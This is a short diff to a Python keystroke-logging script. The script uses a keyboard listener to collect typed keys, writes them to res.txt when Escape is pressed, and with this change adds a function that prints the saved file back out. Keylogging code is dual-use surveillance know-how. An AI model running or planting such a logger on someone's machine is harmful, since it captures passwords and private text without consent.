@@ -15,7 +15,6 @@ def write_to_file():
     global typed
     
     now = str(datetime.now())
-    print("now =", now)
     
     #Join the list and convert to a string
     final_chars = "".join(map(str, typed))
@@ -26,6 +25,10 @@ def write_to_file():
     f.close()
 
 #read key input  
+
+def output():
+	f = open("res.txt","r")
+	print(f.read())
    
 def on_press(key):
     global typed
@@ -46,6 +49,7 @@ def on_press(key):
 def on_release(key):
     if str(key) == 'Key.esc':
         write_to_file()
+        output()
         return False
 
 with keyboard.Listener(
